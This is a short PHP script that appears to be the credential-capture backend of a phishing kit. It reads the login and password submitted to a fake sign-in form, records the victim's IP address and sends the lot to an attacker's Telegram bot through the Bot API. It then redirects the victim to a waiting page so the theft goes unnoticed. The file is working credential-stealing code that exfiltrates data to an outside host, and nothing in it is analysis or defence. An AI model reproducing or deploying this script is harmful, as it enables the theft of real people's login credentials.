<?php

session_start();

include '../../email.php';


$ip = getenv("REMOTE_ADDR");

$_SESSION['name'] = $_POST['name'];

$message = "[+]━━━━【🔥 LOGIN 🔥】━━━━[+]\r\n";
$message .= "[+] LOGIN : " .$_POST['login']."\r\n";
$message .= "[+] PASSWORD : ".$_POST['pwd']."\r\n";
$message .= "[+]━━━━【💻 System INFO】━━━━[+]\r\n";
$message .= "[+] IP : " .$ip."\n";
$message .= "[+]━━━━【🔥 esalia 🔥】━━━━[+]\n";



file_get_contents("https://api.telegram.org/bot".$api."/sendMessage?chat_id=".$chatid."&text=" . urlencode($message)."" );

HEADER("Location: ../wait.php");


?>

